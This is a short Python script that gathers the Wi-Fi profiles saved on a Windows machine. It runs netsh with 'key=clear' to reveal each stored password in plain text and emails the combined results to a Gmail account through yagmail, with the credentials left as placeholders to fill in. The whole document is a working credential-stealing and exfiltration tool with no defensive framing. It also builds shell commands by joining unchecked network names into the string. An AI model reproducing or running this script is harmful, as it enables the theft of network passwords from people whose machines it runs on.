#! /usr/bin/env python

import subprocess
import yagmail
import re


# TODO: Make this function universal in the GUI project.
def send_mail(email, password, content):
    topic = "Wi-fi data collection results"
    yag = yagmail.SMTP(email, password)
    yag.send(email, topic, content)


command_display_networks = "netsh wlan show profile"

networks_data_list = []
try:
    networks = subprocess.check_output(command_display_networks, shell=True)
    network_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

    for network_name in network_names_list:
        command_show_password = "netsh wlan show profile " + network_name + " key=clear"
        current_network_data = subprocess.check_output(command_show_password, shell=True)
        networks_data_list.append(current_network_data)

except subprocess.CalledProcessError:
    networks_data_list.append("No networks data have been found.")

send_mail("example@gmail.com", "password", "".join(networks_data_list))  # fill with necessary data for it to work
